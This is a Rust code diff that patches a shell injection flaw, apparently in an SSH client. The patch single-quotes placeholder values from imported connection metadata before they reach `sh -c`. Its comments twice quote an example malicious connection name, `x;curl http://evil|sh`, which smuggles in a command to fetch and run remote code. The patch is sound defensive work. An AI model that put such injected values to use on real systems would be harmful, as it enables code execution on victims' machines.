@@ -175,6 +175,19 @@ impl CommandPlaceholders {
 
 /// Substitutes `%h` host, `%u` username, `%p` port, `%n` connection name and
 /// `%%` literal `%`; any other `%x` sequence passes through untouched.
+///
+/// Values are POSIX-shell single-quoted before insertion. Placeholder values
+/// come from connection metadata (`host`, `username`, `name`) that may have
+/// been imported from XShell / FinalShell / `ssh_config` without character
+/// filtering — `validate_host_field` only rejects whitespace and `://`, and a
+/// connection name is only trimmed. Substitution happens *before* the string
+/// reaches `sh -c`, so an unquoted `x;curl http://evil|sh` connection name
+/// turned `password_command = "pass show %n"` into a second shell statement
+/// running as the local user.
+///
+/// Quoting keeps the user-visible contract: `%u@%h:%p` still renders the same
+/// text (quoting is invisible to the command's own parsing) and literal `%%`
+/// stays a bare `%`.
 pub fn apply_command_placeholders(command: &str, placeholders: &CommandPlaceholders) -> String {
     let mut output = String::with_capacity(command.len());
     let mut chars = command.chars().peekable();
@@ -190,22 +203,46 @@ pub fn apply_command_placeholders(command: &str, placeholders: &CommandPlacehold
             }
             Some('h') => {
                 chars.next();
-                output.push_str(&placeholders.host);
+                output.push_str(&shell_quoted(&placeholders.host));
             }
             Some('u') => {
                 chars.next();
-                output.push_str(&placeholders.username);
+                output.push_str(&shell_quoted(&placeholders.username));
             }
             Some('p') => {
                 chars.next();
-                output.push_str(&placeholders.port.to_string());
+                output.push_str(&shell_quoted(&placeholders.port.to_string()));
             }
             Some('n') => {
                 chars.next();
-                output.push_str(&placeholders.name);
+                output.push_str(&shell_quoted(&placeholders.name));
             }
             _ => output.push('%'),
         }
     }
     output
+}
+
+/// Single-quote quoting for a substituted placeholder value, applied only when
+/// the value carries a character the shell would interpret.
+///
+/// Ordinary values (`example.com`, `deploy`, `prod-box`, `2222`) stay bare so
+/// templates like `%u@%h:%p` still render the text the user wrote. Anything
+/// outside the inert set — whitespace, quotes, `;`, `|`, `&`, `$`, backtick,
+/// globs, braces, non-ASCII — gets single-quoted, which is what stops an
+/// imported connection named `x;curl http://evil|sh` from becoming a second
+/// shell statement.
+fn shell_quoted(value: &str) -> String {
+    let inert = value.chars().all(|character| {
+        character.is_ascii_alphanumeric()
+            || matches!(
+                character,
+                '.' | '_' | '-' | '@' | ':' | '/' | '=' | '+' | ',' | '%'
+            )
+    });
+    if inert {
+        value.to_string()
+    } else {
+        crate::core::shell_quote::shell_quote(value)
+    }
 }
